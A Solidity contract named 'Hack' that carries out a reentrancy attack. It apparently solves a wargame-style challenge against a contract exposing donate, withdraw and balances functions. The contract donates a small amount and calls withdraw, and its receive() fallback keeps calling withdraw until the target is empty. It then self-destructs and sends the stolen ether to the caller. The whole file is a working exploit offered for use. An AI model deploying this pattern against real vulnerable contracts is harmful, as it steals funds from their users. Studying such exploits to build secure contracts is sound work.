// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
    function balances(address) external view returns (uint256);
}

contract Hack {
    IReentrance private immutable target;
    uint256 private constant ATTACK_AMOUNT = 0.001 ether; // Use a more substantial amount

    constructor(address _target) public {
        target = IReentrance(_target);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Insufficient funds");
        
        // Donate to establish a balance
        target.donate{value: ATTACK_AMOUNT}(address(this));
        require(target.balances(address(this)) >= ATTACK_AMOUNT, "Donation failed");

        // Start the attack
        target.withdraw(ATTACK_AMOUNT);
        
        // Send remaining funds back to attacker
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;
        if (targetBalance > 0) {
            // Withdraw either our full balance or what's left in the contract
            uint256 amount = min(ATTACK_AMOUNT, targetBalance);
            target.withdraw(amount);
        }
    }

    function min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}